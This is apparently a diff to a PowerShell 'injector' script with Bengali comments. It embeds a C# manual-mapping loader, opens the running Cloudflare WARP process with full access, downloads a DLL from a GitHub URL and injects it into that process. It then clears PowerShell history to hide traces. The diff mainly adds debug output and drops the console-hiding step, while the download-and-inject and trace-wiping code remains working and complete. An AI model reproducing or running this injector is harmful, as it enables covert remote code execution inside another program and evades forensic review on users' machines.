@@ -16,27 +16,33 @@ $MaximumHistoryCount               = 0
 *> $null
 $Error.Clear()
 
+Write-Host "==========================================" -ForegroundColor Cyan
+Write-Host "   SysVenson CoreX Injector (Debug Mode)  " -ForegroundColor Cyan
+Write-Host "==========================================" -ForegroundColor Cyan
+Write-Host ""
+
+# ============================================================
+#  ★★★ ১. অ্যাডমিন চেক ★★★
+# ============================================================
+Write-Host "[1] Checking Administrator privileges..." -ForegroundColor Yellow
 if (!([bool]([Security.Principal.WindowsPrincipal] [Security.Principal.WindowsIdentity]::GetCurrent()).IsInRole([Security.Principal.WindowsBuiltInRole] "Administrator")))
 {
+    Write-Host "[ERROR] This script must be run as Administrator. Exiting." -ForegroundColor Red
+    Read-Host "Press Enter to exit"
     exit
 }
+Write-Host "[SUCCESS] Running as Administrator." -ForegroundColor Green
 
 # ============================================================
-#  ★★★ ১. কনসোল উইন্ডো হাইড করুন ★★★
+#  ★★★ ২. কনসোল উইন্ডো হাইড করার অংশ পুরোপুরি বাদ দেওয়া হয়েছে ★★★
+#  (আপনি এখন কনসোল দেখতে পাবেন)
 # ============================================================
-Add-Type -Name Window -Namespace Console -MemberDefinition @'
-[DllImport("Kernel32.dll")]
-public static extern IntPtr GetConsoleWindow();
-[DllImport("user32.dll")]
-public static extern bool ShowWindow(IntPtr hWnd, Int32 nCmdShow);
-'@
-
-$consoleHandle = [Console.Window]::GetConsoleWindow()
-[Console.Window]::ShowWindow($consoleHandle, 0)
 
 # ============================================================
-#  ★★★ ২. C# লোডার (রিমোট ম্যানুয়াল ম্যাপিং সহ) ★★★
+#  ★★★ ৩. C# লোডার (রিমোট ম্যানুয়াল ম্যাপিং) ★★★
 # ============================================================
+Write-Host "[2] Compiling C# Remote Loader..." -ForegroundColor Yellow
+
 $kernel = @'
 using System;
 using System.Runtime.InteropServices;
@@ -123,7 +129,6 @@ public static class RemoteLoader
 
     // ---- Get module base address in remote process by name ----
     static IntPtr GetRemoteModuleBase(IntPtr hProcess, string moduleName) {
-        // Enumerate modules
         uint needed = 0;
         IntPtr[] modules = new IntPtr[1024];
         if (!EnumProcessModules(hProcess, modules, (uint)(modules.Length * IntPtr.Size), out needed))
@@ -144,14 +149,12 @@ public static class RemoteLoader
 
     // ---- Get exported function address from remote module ----
     static IntPtr GetRemoteProcAddress(IntPtr hProcess, IntPtr hModule, string funcName) {
-        // Read DOS header
         byte[] dosHeader = new byte[0x40];
         IntPtr bytesRead;
         if (!ReadProcessMemory(hProcess, hModule, dosHeader, 0x40, out bytesRead)) return IntPtr.Zero;
-        if (BitConverter.ToUInt16(dosHeader, 0) != 0x5A4D) return IntPtr.Zero; // MZ
+        if (BitConverter.ToUInt16(dosHeader, 0) != 0x5A4D) return IntPtr.Zero;
         uint e_lfanew = BitConverter.ToUInt32(dosHeader, 0x3C);
 
-        // Read NT headers
         byte[] ntHeaders = new byte[0x108];
         IntPtr ntAddr = (IntPtr)(hModule.ToInt64() + e_lfanew);
         if (!ReadProcessMemory(hProcess, ntAddr, ntHeaders, 0x108, out bytesRead)) return IntPtr.Zero;
@@ -159,13 +162,12 @@ public static class RemoteLoader
         if (signature != 0x4550) return IntPtr.Zero;
 
         bool is64 = (BitConverter.ToUInt16(ntHeaders, 4) == 0x020B);
-        int optHeaderOffset = 0x18; // after standard header
-        int dataDirOffset = is64 ? 0x70 : 0x60; // after optional header magic
+        int optHeaderOffset = 0x18;
+        int dataDirOffset = is64 ? 0x70 : 0x60;
         uint exportRVA = BitConverter.ToUInt32(ntHeaders, optHeaderOffset + dataDirOffset + 0);
         uint exportSize = BitConverter.ToUInt32(ntHeaders, optHeaderOffset + dataDirOffset + 4);
         if (exportRVA == 0) return IntPtr.Zero;
 
-        // Read export directory
         IntPtr exportAddr = (IntPtr)(hModule.ToInt64() + exportRVA);
         byte[] exportDir = new byte[40];
         if (!ReadProcessMemory(hProcess, exportAddr, exportDir, 40, out bytesRead)) return IntPtr.Zero;
@@ -174,7 +176,6 @@ public static class RemoteLoader
         uint addressOfNameOrdinals = BitConverter.ToUInt32(exportDir, 36);
         uint addressOfFunctions = BitConverter.ToUInt32(exportDir, 28);
 
-        // Search by name
         for (uint i = 0; i < numberOfNames; i++) {
             uint nameRVA = BitConverter.ToUInt32(ReadRemoteMemory(hProcess, (IntPtr)(hModule.ToInt64() + addressOfNames + i * 4), 4), 0);
             IntPtr nameAddr = (IntPtr)(hModule.ToInt64() + nameRVA);
@@ -208,7 +209,6 @@ public static class RemoteLoader
     public static ManualMapResult MapRemote(byte[] dll, IntPtr hProcess, bool callEntry) {
         var res = new ManualMapResult();
 
-        // Validate PE
         if (U16(dll, 0) != 0x5A4D) throw new Exception("Missing MZ");
         int lfa = BitConverter.ToInt32(dll, 0x3C);
         if (U32(dll, lfa) != 0x4550u) throw new Exception("Bad PE sig");
@@ -225,7 +225,6 @@ public static class RemoteLoader
         int st = oo + ohs; var secs = new Sec[ns];
         for (int i = 0; i < ns; i++) { int b = st + i * 40; secs[i] = new Sec { VS = U32(dll, b + 8), VA = U32(dll, b + 12), SRD = U32(dll, b + 16), PRD = U32(dll, b + 20), Ch = U32(dll, b + 36) }; }
 
-        // Allocate remote memory
         IntPtr img = VirtualAllocEx(hProcess, IntPtr.Zero, (UIntPtr)soi, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
         if (img == IntPtr.Zero) throw new Exception("VirtualAllocEx failed: " + Marshal.GetLastWin32Error());
         res.ImageBase = img;
@@ -233,12 +232,10 @@ public static class RemoteLoader
         long delta = ab - (long)ib;
         res.Delta = delta;
 
-        // Write PE headers
         IntPtr bytesWritten;
         if (!WriteProcessMemory(hProcess, img, dll, (int)soh, out bytesWritten))
             throw new Exception("WriteProcessMemory headers failed: " + Marshal.GetLastWin32Error());
 
-        // Write sections
         foreach (var s in secs) {
             if (s.SRD == 0) continue;
             uint cs = s.VS == 0 ? s.SRD : Math.Min(s.SRD, s.VS);
@@ -250,7 +247,6 @@ public static class RemoteLoader
                 throw new Exception("WriteProcessMemory section failed: " + Marshal.GetLastWin32Error());
         }
 
-        // Apply relocations
         if (rrva != 0 && delta != 0) {
             uint ro = rrva, re = rrva + rsz;
             while (ro < re) {
@@ -265,13 +261,13 @@ public static class RemoteLoader
                     int of = e & 0xFFF;
                     if (ty == 0) continue;
                     long tr = pg + of;
-                    if (ty == 10) { // 64-bit
+                    if (ty == 10) {
                         byte[] val = ReadRemoteMemory(hProcess, (IntPtr)(ab + tr), 8);
                         ulong c = BitConverter.ToUInt64(val, 0);
                         ulong newVal = (ulong)((long)c + delta);
                         byte[] newBytes = BitConverter.GetBytes(newVal);
                         WriteProcessMemory(hProcess, (IntPtr)(ab + tr), newBytes, 8, out bytesWritten);
-                    } else if (ty == 3) { // 32-bit
+                    } else if (ty == 3) {
                         byte[] val = ReadRemoteMemory(hProcess, (IntPtr)(ab + tr), 4);
                         uint c = BitConverter.ToUInt32(val, 0);
                         uint newVal = (uint)((long)c + delta);
@@ -283,7 +279,6 @@ public static class RemoteLoader
             }
         }
 
-        // Resolve imports
         if (irva != 0) {
             int ie = 0;
             while (true) {
@@ -296,7 +291,6 @@ public static class RemoteLoader
                 string dn = ReadRemoteString(hProcess, (IntPtr)(ab + nr), 260);
                 IntPtr hMod = GetRemoteModuleBase(hProcess, dn + ".dll");
                 if (hMod == IntPtr.Zero) {
-                    // Maybe try to load it? For simplicity, skip
                     ie++; continue;
                 }
                 long to = 0;
@@ -311,11 +305,8 @@ public static class RemoteLoader
                         long of = unchecked((long)0x8000000000000000L);
                         IntPtr fa = IntPtr.Zero;
                         if ((tv & (ulong)of) != 0) {
-                            // Ordinal import
                             uint ord = (uint)(tv & 0xFFFF);
-                            // Not implemented; skip
                         } else {
-                            // Name import
                             uint nameRVA = (uint)(tv & 0x7FFFFFFF);
                             string fname = ReadRemoteString(hProcess, (IntPtr)(ab + nameRVA + 2), 255);
                             fa = GetRemoteProcAddress(hProcess, hMod, fname);
@@ -330,7 +321,6 @@ public static class RemoteLoader
                         long of = unchecked((long)0x80000000L);
                         IntPtr fa = IntPtr.Zero;
                         if ((tv & (uint)of) != 0) {
-                            // Ordinal
                             uint ord = tv & 0xFFFF;
                         } else {
                             string fname = ReadRemoteString(hProcess, (IntPtr)(ab + tv + 2), 255);
@@ -347,7 +337,6 @@ public static class RemoteLoader
             }
         }
 
-        // Set section permissions
         foreach (var s in secs) {
             uint sz = Math.Max(s.VS, s.SRD);
             if (sz == 0) continue;
@@ -355,7 +344,6 @@ public static class RemoteLoader
             VirtualProtectEx(hProcess, (IntPtr)(ab + s.VA), (UIntPtr)sz, SProt(s.Ch), out oldProt);
         }
 
-        // Call DllMain
         res.DllMainAddr = IntPtr.Zero;
         if (callEntry && ep != 0) {
             res.DllMainAddr = (IntPtr)(ab + ep);
@@ -369,7 +357,6 @@ public static class RemoteLoader
         return res;
     }
 
-    // ---- Cleanup ----
     public static bool FreeRemote(IntPtr hProcess, IntPtr baseAddr) {
         return VirtualFreeEx(hProcess, baseAddr, UIntPtr.Zero, MEM_RELEASE);
     }
@@ -377,53 +364,92 @@ public static class RemoteLoader
 '@
 
 try {
-    Add-Type $kernel -ErrorAction SilentlyContinue
+    Add-Type -TypeDefinition $kernel -ErrorAction Stop
+    Write-Host "[SUCCESS] C# Loader compiled successfully." -ForegroundColor Green
 } catch {
-    # Already loaded
-}
-
-# ============================================================
-#  ★★★ ৩. ক্লাউডফ্লেয়ার WARP.exe প্রক্রিয়া খুঁজে ইনজেক্ট ★★★
-# ============================================================
-$targetProcessName = "CloudflareWARP"  # বা "Cloudflare WARP" – আপনি চেক করে নিন
-
-# প্রক্রিয়া খুঁজুন
-$proc = Get-Process -Name $targetProcessName -ErrorAction SilentlyContinue
-if (-not $proc) {
-    Write-Host "প্রক্রিয়া $targetProcessName পাওয়া যায়নি! প্রস্থান করছি।"
+    Write-Host "[ERROR] Failed to compile C# Loader: $_" -ForegroundColor Red
+    Read-Host "Press Enter to exit"
     exit 1
 }
 
-# প্রক্রিয়া হ্যান্ডেল খুলুন
+# ============================================================
+#  ★★★ ৪. ক্লাউডফ্লেয়ার WARP.exe প্রক্রিয়া খুঁজে ইনজেক্ট ★★★
+# ============================================================
+Write-Host "[3] Searching for target process 'CloudflareWARP'..." -ForegroundColor Yellow
+
+$targetProcessName = "CloudflareWARP"
+$proc = Get-Process -Name $targetProcessName -ErrorAction SilentlyContinue
+
+if (-not $proc) {
+    Write-Host "[ERROR] Process '$targetProcessName' not found! Please make sure Cloudflare WARP is running." -ForegroundColor Red
+    Read-Host "Press Enter to exit"
+    exit 1
+}
+Write-Host "[SUCCESS] Process found. PID: $($proc.Id), Architecture: $($proc.StartInfo.EnvironmentVariables.PROCESSOR_ARCHITECTURE)" -ForegroundColor Green
+
+Write-Host "[4] Opening process handle with FULL access..." -ForegroundColor Yellow
 $hProcess = [RemoteLoader]::OpenProcess(0x1F0FFF, $false, $proc.Id)
 if ($hProcess -eq [IntPtr]::Zero) {
-    Write-Host "OpenProcess ব্যর্থ: " $proc.Id
+    Write-Host "[ERROR] Failed to open process handle. Win32 Error: $([System.Runtime.InteropServices.Marshal]::GetLastWin32Error())" -ForegroundColor Red
+    Read-Host "Press Enter to exit"
+    exit 1
+}
+Write-Host "[SUCCESS] Process handle opened: 0x$($hProcess.ToString('X'))" -ForegroundColor Green
+
+Write-Host "[5] Downloading DLL from GitHub..." -ForegroundColor Yellow
+try {
+    $bytes = (New-Object System.Net.WebClient).DownloadData("https://github.com/desert007/bios/raw/refs/heads/main/version.dll")
+    Write-Host "[SUCCESS] DLL downloaded. Size: $($bytes.Length) bytes" -ForegroundColor Green
+} catch {
+    Write-Host "[ERROR] Failed to download DLL: $_" -ForegroundColor Red
+    [RemoteLoader]::CloseHandle($hProcess)
+    Read-Host "Press Enter to exit"
     exit 1
 }
 
-# DLL ডাউনলোড
-$bytes = (New-Object System.Net.WebClient).DownloadData("https://github.com/desert007/bios/raw/refs/heads/main/version.dll");
-
-# রিমোট ম্যানুয়াল ম্যাপিং
+Write-Host "[6] Starting Remote Manual Mapping (Injecting)..." -ForegroundColor Yellow
 try {
     $result = [RemoteLoader]::MapRemote($bytes, $hProcess, $true)
-    Write-Host "ইনজেকশন সফল! বেস: 0x$($result.ImageBase.ToString('X'))"
+    Write-Host "[SUCCESS] Injection completed successfully!" -ForegroundColor Green
+    Write-Host "        ImageBase: 0x$($result.ImageBase.ToString('X'))" -ForegroundColor Green
+    Write-Host "        ImageSize: $($result.ImageSize) bytes" -ForegroundColor Green
+    Write-Host "        DllMain Address: 0x$($result.DllMainAddr.ToString('X'))" -ForegroundColor Green
+    Write-Host "        Is 64-bit: $($result.Is64Bit)" -ForegroundColor Green
 } catch {
-    Write-Host "ইনজেকশন ব্যর্থ: $_"
+    Write-Host "[CRITICAL ERROR] Injection failed!" -ForegroundColor Red
+    Write-Host "        Error Message: $_" -ForegroundColor Red
+    if ($_.Exception.InnerException) {
+        Write-Host "        Inner Exception: $($_.Exception.InnerException.Message)" -ForegroundColor Red
+    }
     [RemoteLoader]::CloseHandle($hProcess)
+    Read-Host "Press Enter to exit"
     exit 1
 }
 
 # ============================================================
-#  ★★★ ৪. ট্রেস ক্লিয়ার (সাইলেন্ট) ★★★
+#  ★★★ ৫. ট্রেস ক্লিয়ার (সাইলেন্ট) ★★★
 # ============================================================
+Write-Host "[7] Clearing PowerShell history..." -ForegroundColor Yellow
 Clear-History
 $historyPath = (Get-PSReadlineOption).HistorySavePath
 if (Test-Path $historyPath) {
     Clear-Content -Path $historyPath -Force
+    Write-Host "[SUCCESS] History cleared." -ForegroundColor Green
 }
 
 $bytes = $null
 [GC]::Collect()
 [GC]::WaitForPendingFinalizers()
 
+# ============================================================
+#  ★★★ ৬. ইনফিনিটি লুপ (উইন্ডো খোলা রাখতে) ★★★
+# ============================================================
+Write-Host "==========================================" -ForegroundColor Cyan
+Write-Host "[INFO] Injection process finished." -ForegroundColor Yellow
+Write-Host "[INFO] PowerShell window will stay open (Infinite sleep)." -ForegroundColor Yellow
+Write-Host "[INFO] Press CTRL + C to close this window manually." -ForegroundColor Yellow
+Write-Host "==========================================" -ForegroundColor Cyan
+
+while ($true) {
+    Start-Sleep -Seconds 86400
+}
